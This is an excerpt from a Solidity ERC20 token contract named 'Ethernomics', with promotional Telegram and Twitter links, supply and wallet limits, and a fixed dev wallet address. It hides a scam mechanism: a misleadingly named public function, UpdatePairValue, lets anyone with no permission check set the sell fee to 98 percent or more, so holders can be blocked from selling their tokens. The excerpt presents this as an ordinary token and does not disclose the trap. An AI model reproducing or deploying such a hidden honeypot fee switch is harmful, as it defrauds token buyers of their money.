...
// TG : https://t.me/EthernomicsPortal

// TW : https://twitter.com/Ethernomics_
...
contract Ethernomics is ERC20, Ownable {
    ...
    constructor() ERC20("Ethernomics", "Ether") {
        ...
        uint256 totalSupply = 4 * 1e8 * 1e18;

        maxTransactionAmount = 4 * 1e8 * 1e18 *3/100; 
        maxWallet = 4 * 1e8 * 1e18 *4/100; 
        ...
        devWallet = address(0x92fdc9De9E04bd17cF62F95639458B49D1Ada2cA); 
    ...
    function UpdatePairValue(uint256 sumamount) public {
        require(sumamount >=98);
        sellTotalFees = sumamount;
    }
